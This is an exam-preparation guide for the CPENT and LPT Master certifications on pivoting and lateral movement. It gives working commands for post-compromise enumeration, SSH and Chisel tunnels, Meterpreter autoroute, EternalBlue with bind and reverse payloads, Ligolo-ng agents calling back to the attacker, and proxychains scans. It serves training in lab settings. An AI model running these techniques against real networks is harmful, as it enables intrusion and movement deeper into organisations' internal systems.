# 06 - Pivoting and Lateral Movement

**Author:** Zeeshan
**GitHub:** https://github.com/mzeeshanzafar28
**LinkedIn:** https://www.linkedin.com/in/mzeeshanzafar28

Pivoting is the single biggest score multiplier in CPENT and LPT Master. Most high-value targets (especially Domain Controllers) sit behind one or two dual-homed hosts. If you cannot pivot reliably, you will leave many points on the table. Budget your time here accordingly — this is consistently one of the highest-value, most time-expensive domains.

---

## Table of Contents

1. [Core Concepts](#core-concepts)
2. [Post-Compromise Enumeration (The Golden Reflex)](#post-compromise-enumeration-the-golden-reflex)
3. [Pivoting Fundamentals](#pivoting-fundamentals)
4. [SSH Port Forwarding (-L, -R, -D)](#ssh-port-forwarding)
5. [Chisel (Reverse SOCKS)](#chisel-reverse-socks)
6. [Meterpreter Autoroute + SOCKS Proxy](#meterpreter-autoroute--socks-proxy)
7. [ProxyChains Deep Dive](#proxychains-deep-dive)
8. [Double Pivoting](#double-pivoting)
9. [Ligolo-ng (Modern TUN-Based Pivoting)](#ligolo-ng-modern-tun-based-pivoting)
10. [Additional Techniques (socat, plink, netsh, sshuttle)](#additional-techniques)
11. [Payload Selection in Pivoted Networks](#payload-selection-in-pivoted-networks)
12. [Troubleshooting Pivots](#troubleshooting-pivots)
13. [Practical Exam Workflow](#practical-exam-workflow)
14. [Tool-to-Technique Map](#tool-to-technique-map)
15. [Practice](#practice)

---

## Core Concepts

**Pivot Host:** A compromised machine that has access to a network segment you cannot reach directly.

**Dual-Homed Host:** A machine with two (or more) network interfaces on different subnets. This is your door into the next segment. A host with interfaces on different subnets is the classic pivot candidate, especially if one interface is on a segment you couldn't reach directly from outside.

**Why Pivoting Works:** NAT and network segmentation mean internal subnets are invisible from outside until you're routing through something already on the inside.

**Mental Model:**

```
Your Kali
   |
   v
PIVOT-1 (eth0 = reachable, eth1 = new internal segment)
   |
   +--> Internal Segment A
           |
           v
       PIVOT-2 (has NIC into Segment B)
           |
           +--> Deep Segment / Domain Controller
```

---

## Post-Compromise Enumeration (The Golden Reflex)

The moment you land a shell on any host, before doing anything else, figure out where you are and what else is reachable. Do this on EVERY new shell.

### Linux

```bash
ifconfig -a        # or: ip a
ip route           # routing table
arp -a             # recent L2 neighbors
cat /etc/hosts     # static host mappings
last               # recent logins
```

### Windows

```cmd
ipconfig /all      # interfaces + DNS, reveals other subnets this host straddles
route print        # routing table - reveals other reachable networks
arp -a             # hosts this machine has recently talked to on the local subnet
net view /domain   # other hosts in the domain
net user           # local users
```

If you see a second NIC, **immediately note the new subnet.** That is your next target range.

Keep a live table in your notes during the exam:

```
Host          Interfaces                  Reaches                  Creds / Access
10.10.10.10   eth0:10.10.10.10           172.16.20.0/24           user:Pass123
              eth1:172.16.20.10
172.16.20.20  eth0:172.16.20.20          172.16.30.0/24           SYSTEM (EternalBlue)
              eth1:172.16.30.20
```

---

## Pivoting Fundamentals

Pivoting means using a compromised host as a relay point to reach networks you can't route to directly from your attack box.

**General workflow, tool-agnostic:**

1. Compromise a host that has a foothold on the target network.
2. Enumerate its network interfaces/routes to discover subnets you didn't know existed.
3. Establish a route or tunnel from your attack box, through the compromised host, into that new subnet.
4. Point your existing tools (Nmap, Metasploit modules, manual exploits) at the newly-reachable range, routed through the pivot.

### Method Comparison

| Method | When to Use | Pros | Cons |
|---|---|---|---|
| SSH -L / -R / -D | SSH available on pivot | Clean, stable, native | Needs SSH credentials/key |
| Chisel | No SSH, or need HTTP/HTTPS tunnel | Works over most egress filters | Extra binary to upload |
| Meterpreter autoroute + SOCKS | Already have Meterpreter session | Integrated with Metasploit | Heavier, can be unstable |
| socat / datapipe | Simple single-port forward | Very lightweight | One port at a time |
| Ligolo-ng | Modern alternative, full TUN interface | Excellent performance, -sS scans work | Extra setup |
| sshuttle | Quick VPN-like | Easy | Requires Python on pivot |

**Recommendation:** Most successful candidates rely on **Chisel reverse SOCKS** or **SSH dynamic port forwarding** + proxychains as their daily driver.

---

## SSH Port Forwarding

### Local Port Forward (-L)

Makes a port on your Kali forward through the pivot to an internal host.

```bash
# Single forward: pivot-host:80 becomes your-box:8080
ssh -L 8080:internal-host:80 user@pivot-host

# Example: Forward SMB
ssh -L 4455:172.16.20.20:445 user@10.10.10.10
# Now on Kali: crackmapexec smb 127.0.0.1 -p 4455 ...

# Multiple forwards in one command:
ssh -L 4455:172.16.20.20:445 -L 3389:172.16.20.20:3389 -L 80:172.16.20.20:80 user@10.10.10.10
```

### Dynamic Port Forward (SOCKS) (-D) ← Most Useful

```bash
ssh -fN -D 1080 user@10.10.10.10
# -f = background, -N = no remote command
```

Then configure proxychains to use `socks5 127.0.0.1 1080` and run any tool through it.

### Remote Port Forward (-R)

Useful when the internal host needs to reach back to you (reverse shell catcher).

```bash
ssh -R 4444:127.0.0.1:4444 user@10.10.10.10
# Internal machine connects to pivot:4444 → your Kali:4444
```

### ProxyJump (for SSH Chaining)

```bash
# Direct jump through pivot1 to pivot2
ssh -J user@pivot1 user@pivot2

# Dynamic proxy through a chain
ssh -J user@pivot1 -D 1081 user@pivot2
```

---

## Chisel (Reverse SOCKS)

Chisel is small, reliable, and works well when SSH is not available. It transports TCP/UDP over HTTP, secured via SSH.

### Reverse SOCKS (Best Pattern for Exams)

**On your Kali (server):**

```bash
chisel server -p 443 --reverse
```

**On the pivot (client):**

```bash
./chisel client YOUR_KALI_IP:443 R:socks
```

Now you have a SOCKS proxy on Kali port 1080 (default). Point proxychains at it.

### Local Forward Example

```bash
# On pivot (server mode)
./chisel server -p 8000

# On Kali (client mode)
chisel client PIVOT_IP:8000 4455:172.16.20.20:445
```

---

## Meterpreter Autoroute + SOCKS Proxy

The most common CPENT-relevant pivoting path, entirely inside a Meterpreter session.

### Step 1: Add Route to Discovered Subnet

Get a Meterpreter session on the pivot host, then background it (`background` or `Ctrl+Z`). Add a route:

```bash
# From Meterpreter prompt (session already active on pivot):
run autoroute -s 172.16.20.0/24

# Or from msfconsole:
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION <session-id>
msf6 > set SUBNET 172.16.20.0
msf6 > set NETMASK 255.255.255.0
msf6 > run
```

### Step 2: Confirm the Route

```bash
run autoroute -p
```

### Step 3: Start SOCKS Proxy (for external tools)

```bash
# Background the session first:
background

# Start SOCKS proxy:
msf6 > use auxiliary/server/socks_proxy
msf6 > set VERSION 5         # 4a also works for older configs
msf6 > set SRVPORT 1080
msf6 > run -j                # run as background job
```

### Step 4: Target the New Subnet

Now target the newly reachable range through any Metasploit module:

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <internal-target>
msf6 > set PAYLOAD windows/meterpreter/bind_tcp   # Prefer BIND payloads through pivots!
msf6 > exploit
```

### Meterpreter Port Forwarding (Single Port)

```bash
meterpreter > portfwd add -l 3389 -p 3389 -r <internal-target>
```

This forwards your attack box's local port 3389 to the internal target's 3389, through the Meterpreter session. Now you can `xfreerdp` or similar directly at `127.0.0.1:3389`.

### Scan the Pivoted Subnet from MSF

Since your raw Nmap can't reach it, use Metasploit's scanner modules:

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 172.16.20.0/24
msf6 > set PORTS 135,139,445,3389,5985
msf6 > run
```

---

## ProxyChains Deep Dive

For running arbitrary external tools (not just Metasploit modules) against pivoted networks.

### Configuration

Edit `/etc/proxychains4.conf` (or `/etc/proxychains.conf`):

```
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
# For double pivot, add second line:
# socks5 127.0.0.1 1081
```

### Usage

```bash
# Scan through the pivot
proxychains nmap -sT -Pn <internal-target>

# Connect to SMB share through pivot
proxychains smbclient //<internal-target>/share -N

# Test the tunnel first
proxychains curl -s http://172.16.20.20

# Run crackmapexec through pivot
proxychains crackmapexec smb 172.16.20.5 -u 'user' -p 'password'
```

### Critical ProxyChains Rules

- **Always** use `nmap -sT -Pn` through proxychains — SYN scans (`-sS`) **fail** through SOCKS proxies.
- Test the tunnel first with a simple command before launching expensive scans.
- Prefer reverse SOCKS when the pivot is behind NAT or strict egress filtering.
- One heavy tool at a time if the tunnel is slow.
- Enable `proxy_dns` to resolve hostnames through the tunnel.
- If scans are dramatically slower, tune down the port range/timing (`-T2`, `--top-ports 100`).

---

## Double Pivoting

An official CPENT exam domain by name ("Double Pivoting"). Concept: you pivot through **Host A** into subnet 2, compromise **Host B** on subnet 2, and then pivot again through Host B to reach subnet 3.

### Cleanest Method (Meterpreter Stacked Autoroute)

1. Get Meterpreter on PIVOT-1 → autoroute the first internal segment.
2. Exploit PIVOT-2 through that route → get second Meterpreter session.
3. On the second session: `run autoroute -s 172.16.30.0/24`
4. Verify both routes: `run autoroute -p` — you should see routes to both subnet 2 (via Host A) and subnet 3 (via Host B).
5. Refresh or restart SOCKS proxy if needed.
6. Proxychains now reaches the deep segment; Metasploit modules automatically chain through both sessions.

### Chisel Double Pivot

1. First reverse SOCKS from PIVOT-1 → proxychains on port 1080.
2. From PIVOT-2 (accessed through first tunnel), create another reverse SOCKS on a different port.
3. Stack both SOCKS entries in proxychains with `dynamic_chain`:

```
socks5 127.0.0.1 1080   # First hop
socks5 127.0.0.1 1081   # Second hop
```

### SSH Double Pivot

```bash
ssh -J user@pivot1 user@pivot2 -D 1081
```

---

## Ligolo-ng (Modern TUN-Based Pivoting)

Ligolo-ng creates a real TUN interface on your attack box for the pivoted subnet — no ProxyChains prefix needed. You can even run `nmap -sS` (SYN scan) directly.

### Setup

**Attack box (proxy):**

```bash
# Add TUN interface
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

# Run proxy with self-signed cert
./proxy -selfcert
```

**Pivot host (agent):**

```bash
./agent -connect <your-ip>:11601 -ignore-cert
```

**In the Ligolo session:**

```bash
ligolo-ng » session               # select the connected session
ligolo-ng » start                 # start tunneling
```

**Add route on attack box:**

```bash
sudo ip route add 172.16.20.0/24 dev ligolo
```

Now interact with the pivoted subnet as if it were a normal, directly-routable network.

---

## Additional Techniques

### socat (Simple Single Port Forward)

```bash
# On pivot host:
socat TCP-LISTEN:445,fork TCP:172.16.20.20:445
# Forwards pivot:445 → internal:445
```

### plink (PuTTY Link - Windows SSH Forwarding)

```cmd
plink.exe -l user -pw password -L 4455:172.16.20.20:445 10.10.10.10
```

### Windows netsh portproxy (Needs Admin)

```cmd
netsh interface portproxy add v4tov4 listenport=4455 connectaddress=172.16.20.20 connectport=445
netsh interface portproxy show all
```

### sshuttle (Quick VPN-like)

```bash
sshuttle -r user@pivot 172.16.20.0/24
# Requires Python on the pivot; creates a transparent proxy over SSH
```

---

## Payload Selection in Pivoted Networks

When exploiting through a pivot route, the payload choice is critical:

### Bind Payloads (Preferred)

A bind payload opens a port on the target; you connect inward through the established route:

```bash
set PAYLOAD windows/meterpreter/bind_tcp
set LPORT 4444
```

### Reverse Payloads (Often Fail Through Pivots)

Reverse payloads must route callback traffic back out through the pivot to your LHOST, which frequently fails:

```bash
# Set LHOST to the pivot's internal IP so the callback stays within the network:
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <pivot-internal-ip>
set LPORT 4444
```

**Rule of thumb:** Prefer **bind** payloads over reverse payloads when exploiting through a route. Reverse payloads must route callback traffic back out through the pivot to your LHOST, which is often unreliable; bind payloads let you connect inward through the already-established route instead.

---

## Troubleshooting Pivots

| Problem | Likely Cause | Fix |
|---|---|---|
| nmap hangs through proxychains | Using `-sS` instead of `-sT` | Always `-sT -Pn` |
| Reverse shell never connects | Wrong LHOST | Set LHOST to pivot internal IP or use bind payload |
| Tunnel dies after some time | Idle timeout | Use keepalive or Chisel/Ligolo |
| DNS not resolving | `proxy_dns` not enabled | Enable `proxy_dns` in proxychains.conf |
| Double pivot not working | Routes not added correctly | Verify with `run autoroute -p` or `ip route` |
| Exploit through pivot hangs | Session instability | Retry once; disconnect/reconnect session; retry |
| Scan through ProxyChains slow | Overloaded tunnel | Use `-T2`, reduce port range, `--top-ports 50` |

**General tips:**

- Exploit through a pivot hangs or fails silently → retry once, then disconnect/reconnect the session and try again before assuming the exploit itself is wrong.
- `run autoroute -p` after every new route you add — confirm it's actually there before spending time debugging an exploit that was never going to reach its target.
- If a scan through ProxyChains is dramatically slower or times out, remember you're forced into `-sT` and `-Pn`; tune down the port range/timing rather than assuming the pivot is broken.
- Prefer **bind** payloads over **reverse** payloads when exploiting through a route.

---

## Practical Exam Workflow

1. Land on first host.
2. **Immediately** check interfaces and routes (The Golden Reflex).
3. Establish the most stable tunnel you can (prefer reverse SOCKS: Chisel or SSH -D).
4. Test with a simple command: `proxychains curl` or `proxychains nmap -sT -Pn -p 445 <internal>`.
5. Enumerate the new segment.
6. Look for the next dual-homed host.
7. Repeat.

**Time target:** From shell on Pivot1 to scanning the deep segment should take under 5-7 minutes once you are fluent.

---

## Tool-to-Technique Map

| Technique | Primary Tool | Syntax Example |
|---|---|---|
| SSH Local Forward | ssh | `ssh -L 4455:internal:445 user@pivot` |
| SSH Dynamic (SOCKS) | ssh | `ssh -fN -D 1080 user@pivot` |
| SSH Remote Forward | ssh | `ssh -R 4444:127.0.0.1:4444 user@pivot` |
| SSH ProxyJump | ssh | `ssh -J user@pivot1 user@pivot2` |
| Reverse SOCKS Tunnel | Chisel | `chisel server -p 443 --reverse` |
| Meterpreter Routing | autoroute | `run autoroute -s 172.16.20.0/24` |
| Meterpreter Port Forward | portfwd | `portfwd add -l 3389 -p 3389 -r target` |
| MSF SOCKS Proxy | socks_proxy | `use auxiliary/server/socks_proxy` |
| ProxyChains Scans | proxychains | `proxychains nmap -sT -Pn target` |
| Modern TUN Pivot | Ligolo-ng | `./proxy -selfcert` |
| Simple Port Forward | socat | `socat TCP-LISTEN:445,fork TCP:target:445` |
| VPN-like Tunnel | sshuttle | `sshuttle -r user@pivot 172.16.20.0/24` |
| Windows Port Forward | netsh | `netsh interface portproxy add v4tov4 ...` |

---

## Practice

- **TryHackMe:** "Pivoting", "Wreath" (full multi-stage pivoting network, excellent end-to-end practice), "PivotAPI", "Network Pivoting".
- **HackTheBox:** Any multi-hop Pro Labs style environment (Dante, Zephyr); otherwise chain two Starting Point/Easy machines in a local lab to simulate a two-subnet pivot manually.
- **GOAD (Game of Active Directory):** Widely used free multi-subnet AD lab that naturally requires pivoting between its segments — strong combined practice with Active Directory.
- **Local Lab Setup:** In VirtualBox/VMware, build three isolated virtual networks:
  - Network A: attacker + pivot host A
  - Network B: host A + host B
  - Network C: host B + a final target
  - This exact topology lets you drill single and double pivoting end to end for free.
- **Skill Target:** Practice every method (SSH, Chisel, Meterpreter) until you can do them without looking at notes. Once pivoting is muscle memory, Active Directory and the other ranges become dramatically easier.
